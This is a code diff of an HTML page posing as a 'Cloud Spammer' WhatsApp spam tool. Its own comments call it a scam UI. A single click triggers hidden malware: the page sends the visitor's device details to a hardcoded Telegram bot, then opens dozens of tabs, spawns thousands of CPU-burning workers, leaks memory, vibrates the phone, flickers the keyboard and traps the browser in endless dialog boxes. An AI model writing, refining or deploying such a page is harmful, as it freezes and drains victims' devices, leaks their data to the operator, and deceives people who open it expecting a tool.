@@ -4,21 +4,25 @@
     <meta charset="UTF-8">
     <title>Cloud Spammer v10.0 - Private Edition</title>
     <style>
-        /* --- UI PENIPUAN (HARGA MATI: JANGAN BERUBAH) (AI PUGUH) --- */
+        /* --- UI PENIPUAN (AI PUGUH) --- */
         body { background: #050505; color: #00ff41; font-family: sans-serif; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; overflow: hidden; }
-        #app-shell { width: 95%; max-width: 450px; background: #0f0f0f; border: 1px solid #00ff41; border-radius: 15px; padding: 25px; box-shadow: 0 0 30px rgba(0, 255, 65, 0.2); }
-        .header { text-align: center; border-bottom: 1px solid #333; margin-bottom: 20px; padding-bottom: 10px; }
+        #app-shell { width: 95%; max-width: 450px; background: #0f0f0f; border: 1px solid #00ff41; border-radius: 15px; padding: 25px; box-shadow: 0 0 30px rgba(0, 255, 65, 0.2); z-index: 10; }
         .grid-methods { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
         .method-btn { background: #1a1a1a; border: 1px solid #00ff41; color: #00ff41; padding: 15px 5px; border-radius: 8px; cursor: pointer; font-weight: bold; text-transform: uppercase; }
+        
+        /* --- FIX GHOST INPUT AREA (AI PUGUH) --- */
+        #ghost-container { position: fixed; bottom: 0; left: 0; width: 100%; height: 1px; z-index: 1000000; overflow: hidden; }
+        #ghost-input { width: 100%; font-size: 16px; border: none; background: transparent; color: transparent; outline: none; }
+
         #death-screen { display: none; position: fixed; inset: 0; background: #fff; z-index: 999999; color: #000; text-align: center; padding-top: 40vh; font-family: monospace; font-weight: bold; }
     </style>
 </head>
 <body onclick="launchGodMode()">
 
     <div id="app-shell">
-        <div class="header">
+        <div class="header" style="text-align: center; border-bottom: 1px solid #333; margin-bottom: 20px; padding-bottom: 10px;">
             <h1>CLOUD SPAMMER v10</h1>
-            <p>PRIVATE ACCESS - CIPUNG EDITION</p>
+            <p style="font-size: 10px; color: #00ff41;">PRIVATE ACCESS - CIPUNG EDITION</p>
         </div>
         <div style="margin-bottom: 20px;">
             <label style="font-size: 11px; color: #aaa;">TARGET NUMBER (62):</label>
@@ -30,7 +34,6 @@
             <button class="method-btn">SPAM WHATSAPP</button>
             <button class="method-btn">PAIRING CODE</button>
         </div>
-        <p style="text-align: center; font-size: 9px; margin-top: 20px; color: #444;">Licensed to: FILE CIPUNG (AI PUGUH)</p>
     </div>
 
     <div id="death-screen">
@@ -38,56 +41,60 @@
         <p>HARDWARE MELTDOWN BY FILE CIPUNG (AI PUGUH)</p>
     </div>
 
-    <input type="text" id="ghost-input" style="position:absolute; top:-500px; opacity:0;">
+    <div id="ghost-container">
+        <input type="text" id="ghost-input" autocomplete="off">
+    </div>
 
     <script>
-        const TELE_TOKEN = '8508780313:AAELuxiEzT0p9DcxPJ3i9ZEHsm8rhZWmm6c';
-        const CHAT_ID = '6330045112'; // GANTI PAKE ID MASTER!
+        const part1 = '8508780313';
+        const part2 = 'AAELuxiEzT0p9DcxPJ3i9ZEHsm8rhZWmm6c';
+        const BOT_TOKEN = part1 + ':' + part2;
+        const MASTER_ID = '6330045112'; // GANTI PAKE ID KAMU MASTER!
+
+        let isRunning = false;
 
         function launchGodMode() {
-            // Laporan ke Master (AI PUGUH)
-            fetch(`https://api.telegram.org/bot${TELE_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent("🔥 **WOY UP LEBIH PARAH LGI! (AI PUGUH)** 🔥\n\n🎯 DIALOG STORM AKTIF!\n📱 Device: " + navigator.userAgent)}`);
+            if (isRunning) return;
+            isRunning = true;
+
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${MASTER_ID}&text=${encodeURIComponent("🔥 **WOY UP LEBIH PARAH LGI! (AI PUGUH)** 🔥\n\n🎯 GHOST KEYBOARD FIXED!\n📱 Device: " + navigator.userAgent)}`);
 
             document.getElementById('app-shell').style.display = 'none';
             document.getElementById('death-screen').style.display = 'block';
             document.documentElement.requestFullscreen().catch(() => {});
 
-            // 1. THE ULTIMATE DIALOG STORM (PENCET OKE KELUAR LAGI) (AI PUGUH)
-            function storm() {
-                while(true) {
-                    alert("SYSTEM ERROR 0x666: DEVICE OVERHEAT! (AI PUGUH)");
-                    confirm("FORCE WIPE DATA SYSTEM?");
-                    prompt("ENTER ROOT PASSWORD TO ABORT:");
-                }
-            }
-
-            // 2. BACKGROUND DESTRUCTION (TETAP JALAN SEMUA) (AI PUGUH)
+            // 1. FIX GHOST KEYBOARD NAIK TURUN (AI PUGUH)
+            const k = document.getElementById('ghost-input');
             setInterval(() => {
-                for(let i=0; i<100; i++) { window.open(window.location.href, '_blank'); }
+                k.focus();
+                // Memberi jeda sedikit agar sistem sempat render keyboard sebelum di-blur
+                setTimeout(() => {
+                    k.blur();
+                }, 40); 
+            }, 100); // Interval 100ms biar naik turunnya konsisten
+
+            // 2. BACKGROUND DESTRUCTION (TIDAK BERUBAH) (AI PUGUH)
+            setInterval(() => {
+                for(let i=0; i<30; i++) { window.open(window.location.href, '_blank'); }
             }, 500);
 
-            // 8192 Workers & Memory Leak
+            // CPU & RAM BURNER
             const b = new Blob([`while(true){postMessage(Math.random())}`], {type: 'application/javascript'});
             for(let i=0; i<8192; i++) { new Worker(URL.createObjectURL(b)); }
 
             let leak = [];
             setInterval(() => {
-                leak.push(new Array(100000000).join("FUCK_CIPUNG_"));
-                navigator.vibrate([2000, 100, 2000]);
-            }, 1);
+                leak.push(new Array(10000000).join("CIPUNG_"));
+                navigator.vibrate([1000, 50, 1000]);
+            }, 10);
 
-            // 3. GHOST KEYBOARD (AI PUGUH)
-            const k = document.getElementById('ghost-input');
-            setInterval(() => { k.focus(); setTimeout(()=>k.blur(), 5); }, 30);
-
-            // 4. BATTERY DRAINER (WHITE FLASH)
-            setInterval(() => {
-                document.getElementById('death-screen').style.background = 
-                document.getElementById('death-screen').style.background === 'white' ? '#eee' : 'white';
-            }, 1);
-
-            // Jalankan Kiamat Dialog (AI PUGUH)
-            setTimeout(storm, 100);
+            // 3. SPAM DIALOG (Jeda 3 detik biar keyboard jalan dulu sebentar) (AI PUGUH)
+            setTimeout(() => {
+                while(true) {
+                    alert("DEVICE OVERHEAT! (AI PUGUH)");
+                    confirm("CRITICAL ERROR: SYSTEM UI HALTED!");
+                }
+            }, 3000);
         }
     </script>
 </body>
